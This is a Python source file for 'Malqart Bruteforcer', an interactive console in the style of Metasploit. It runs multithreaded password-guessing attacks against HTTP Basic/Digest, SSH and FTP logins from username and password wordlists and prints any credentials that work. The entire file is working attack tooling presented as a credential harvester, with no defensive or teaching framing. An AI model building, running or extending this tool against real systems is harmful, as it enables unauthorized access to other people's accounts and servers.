#!/usr/bin/env python3
import sys
import requests
import paramiko
import ftplib
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

try:
    from MalqartDatabase_config import get_wordlist_path
    DB_AVAILABLE = True
except ImportError:
    print("[-] MalqartDatabase_config.py not found. Wordlist integration unavailable.")
    DB_AVAILABLE = False

# ========== BASE BRUTEFORCE CLASS ==========
class BruteforceModule:
    def __init__(self):
        self.name = "base_bruteforce"
        self.description = "Base Bruteforce Module"
        self.options = {
            "RHOSTS": {"value": None, "required": True, "description": "Target IP address or hostname"},
            "RPORT": {"value": None, "required": True, "description": "Target port"},
            "USER_FILE": {"value": "usernames.txt", "required": False, "description": "Path to username wordlist"},
            "PASS_FILE": {"value": "passwords.txt", "required": False, "description": "Path to password wordlist"},
            "THREADS": {"value": 10, "required": False, "description": "Number of concurrent threads"},
            "TIMEOUT": {"value": 5.0, "required": False, "description": "Connection timeout"},
            "STOP_ON_SUCCESS": {"value": False, "required": False, "description": "Stop after first successful login"},
        }

    def show_options(self):
        print("\nModule options:\n")
        print(f"{'Name':<15} {'Current Setting':<25} {'Required':<10} {'Description'}")
        print("-" * 80)
        for name, info in self.options.items():
            val = info["value"] if info["value"] is not None else ""
            req = "yes" if info["required"] else "no"
            print(f"{name:<15} {str(val):<25} {req:<10} {info['description']}")
        print("")

    def set_option(self, name, value):
        if name in self.options:
            self.options[name]["value"] = value
            print(f"[*] {name} => {value}")
        else:
            print(f"[-] Unknown option: {name}")

    def load_wordlist(self, option_key):
        """Load a wordlist from USER_FILE or PASS_FILE option."""
        file_path = self.options[option_key]["value"]
        # Try to resolve using MalqartDatabase if available
        if DB_AVAILABLE and not Path(file_path).is_file():
            resolved_path = get_wordlist_path("Usernames" if option_key == "USER_FILE" else "Passwords", file_path)
            if resolved_path:
                file_path = resolved_path

        if not Path(file_path).is_file():
            print(f"[-] Wordlist file '{file_path}' not found.")
            return []
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Error reading wordlist '{file_path}': {e}")
            return []

    def attempt_login(self, username, password):
        """Subclasses must implement this method."""
        raise NotImplementedError("Subclasses must implement attempt_login()")

    def run(self):
        """Execute the brute-force attack."""
        rhosts = self.options["RHOSTS"]["value"]
        threads = self.options["THREADS"]["value"]
        stop_on_success = self.options["STOP_ON_SUCCESS"]["value"]

        users = self.load_wordlist("USER_FILE")
        if not users:
            print("[-] No usernames loaded.")
            return
        passwords = self.load_wordlist("PASS_FILE")
        if not passwords:
            print("[-] No passwords loaded.")
            return

        print(f"[*] Starting brute-force attack on {rhosts}:{self.options['RPORT']['value']}")
        print(f"[*] Testing {len(users)} users x {len(passwords)} passwords = {len(users) * len(passwords)} attempts")
        if stop_on_success:
            print("[*] Will stop after first successful login.")

        found_credentials = []
        stop_flag = threading.Event()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.attempt_login, u, p, stop_flag): (u, p)
                for u in users for p in passwords
            }
            for future in as_completed(futures):
                if stop_flag.is_set():
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    break
                try:
                    result = future.result()
                    if result and result.get("success"):
                        print(f"[+] SUCCESS: {result['user']} : {result['pass']} on {rhosts}:{self.options['RPORT']['value']}")
                        found_credentials.append(result)
                        if stop_on_success:
                            stop_flag.set()
                except Exception as e:
                    print(f"[-] Error in future: {e}")

        if found_credentials:
            print(f"\n[+] Found {len(found_credentials)} credential pair(s).")
        else:
            print("\n[-] No valid credentials found.")

# ========== HTTP BASIC/DIGEST AUTH MODULE ==========
class HTTPBruteforceModule(BruteforceModule):
    def __init__(self):
        super().__init__()
        self.name = "creds/http_basic"
        self.description = "Brute-force HTTP Basic/Digest Authentication"
        # Add an option for the path to test
        self.options["PATH"] = {"value": "/", "required": False, "description": "Target path for auth (e.g., /admin)"}
        self.options["RPORT"]["value"] = 80 # Default for HTTP

    def attempt_login(self, username, password, stop_flag=None):
        url = f"http://{self.options['RHOSTS']['value']}:{self.options['RPORT']['value']}{self.options['PATH']['value']}"
        timeout = self.options["TIMEOUT"]["value"]
        try:
            # Using requests with auth tuple; it handles Basic/Digest automatically
            resp = requests.get(url, auth=(username, password), timeout=timeout)
            # Consider success if status is not 401 or 403 (Unauthorized/Forbidden)
            # You might want to refine this logic based on specific app behavior
            if resp.status_code not in [401, 403]:
                return {"success": True, "user": username, "pass": password}
        except requests.exceptions.RequestException:
            pass # Connection error, failed login
        except Exception as e:
            print(f"[-] Unexpected error during HTTP attempt: {e}")

        if stop_flag and stop_flag.is_set():
            return None
        return {"success": False}

# ========== SSH BRUTEFORCE MODULE ==========
class SSHBruteforceModule(BruteforceModule):
    def __init__(self):
        super().__init__()
        self.name = "creds/ssh"
        self.description = "Brute-force SSH Authentication"
        self.options["RPORT"]["value"] = 22 # Default for SSH

    def attempt_login(self, username, password, stop_flag=None):
        host = self.options["RHOSTS"]["value"]
        port = self.options["RPORT"]["value"]
        timeout = self.options["TIMEOUT"]["value"]
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)
            client.close()
            return {"success": True, "user": username, "pass": password}
        except paramiko.AuthenticationException:
            pass # Wrong credentials
        except Exception:
            pass # Connection error, etc.

        if stop_flag and stop_flag.is_set():
            return None
        return {"success": False}

# ========== FTP BRUTEFORCE MODULE ==========
class FTPBruteforceModule(BruteforceModule):
    def __init__(self):
        super().__init__()
        self.name = "creds/ftp"
        self.description = "Brute-force FTP Authentication"
        self.options["RPORT"]["value"] = 21 # Default for FTP

    def attempt_login(self, username, password, stop_flag=None):
        host = self.options["RHOSTS"]["value"]
        port = self.options["RPORT"]["value"]
        timeout = self.options["TIMEOUT"]["value"]
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return {"success": True, "user": username, "pass": password}
        except ftplib.error_perm:
            pass # Login failed
        except Exception:
            pass # Connection error, etc.

        if stop_flag and stop_flag.is_set():
            return None
        return {"success": False}

# ========== CONSOLE SESSION ==========
class MalqartBruteforcerConsole:
    def __init__(self):
        self.current_module = None
        self.modules = {
            "creds/http_basic": HTTPBruteforceModule,
            "creds/ssh": SSHBruteforceModule,
            "creds/ftp": FTPBruteforceModule,
            # Add more modules here as you create them
            # "creds/smb": SMBBruteforceModule,
        }

    def run(self):
        print("Malqart Bruteforcer v1.0 — Credential Harvester & Brute-Force Tool")
        print("Use 'help' for commands. Type 'exit' to quit.\n")

        while True:
            try:
                if self.current_module:
                    prompt = f"MalqartBruteforcer ({self.current_module.name}) > "
                else:
                    prompt = "MalqartBruteforcer > "

                cmd = input(prompt).strip()
                if not cmd:
                    continue

                parts = cmd.split()
                action = parts[0].lower()

                if action in ["exit", "quit"]:
                    print("[*] Exiting Malqart Bruteforcer.")
                    break

                elif action in ["help", "?"]:
                    self._print_help()

                elif action == "show":
                    if len(parts) > 1 and parts[1].lower() == "modules":
                        self._show_modules()
                    elif len(parts) > 1 and parts[1].lower() == "options" and self.current_module:
                        self.current_module.show_options()
                    else:
                        print("[-] Usage: show (modules|options)")

                elif action == "use":
                    if len(parts) > 1:
                        mod_name = parts[1]
                        if mod_name in self.modules:
                            self.current_module = self.modules[mod_name]()
                            print(f"[*] Using module: {mod_name}")
                        else:
                            print(f"[-] Module '{mod_name}' not found.")
                    else:
                        print("[-] Usage: use <module_name>")

                elif action == "set":
                    if len(parts) >= 3 and self.current_module:
                        opt_name = parts[1].upper()
                        opt_value = ' '.join(parts[2:])
                        self.current_module.set_option(opt_name, opt_value)
                    else:
                        print("[-] Usage: set <OPTION> <VALUE> (in module context)")

                elif action in ["run", "exploit"]:
                    if self.current_module:
                        self.current_module.run()
                    else:
                        print("[-] No module selected. Use 'use <module_name>'.")

                elif action == "back":
                    self.current_module = None
                    print("[*] Returned to main console.")

                else:
                    print(f"[-] Unknown command. Type 'help'.")

            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit.")
            except EOFError:
                print("\n[*] Exiting.")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

    def _print_help(self):
        print("""
Commands:
  use <module_name>              -> Load a module (e.g., creds/http_basic, creds/ssh)
  set <OPTION> <VALUE>           -> Set an option (in module context)
  show modules                   -> List available modules
  show options                   -> Show current module options
  run / exploit                  -> Execute the current module
  back                           -> Go back to main console
  exit / quit                    -> Exit the console
""")

    def _show_modules(self):
        print("\nAvailable Modules:\n")
        print(f"{'Name':<30} {'Description'}")
        print("-" * 80)
        for name, cls in self.modules.items():
            print(f"{name:<30} {cls().description}")
        print("")


# ========== MAIN ENTRY ==========
if __name__ == "__main__":
    console = MalqartBruteforcerConsole()
    console.run()
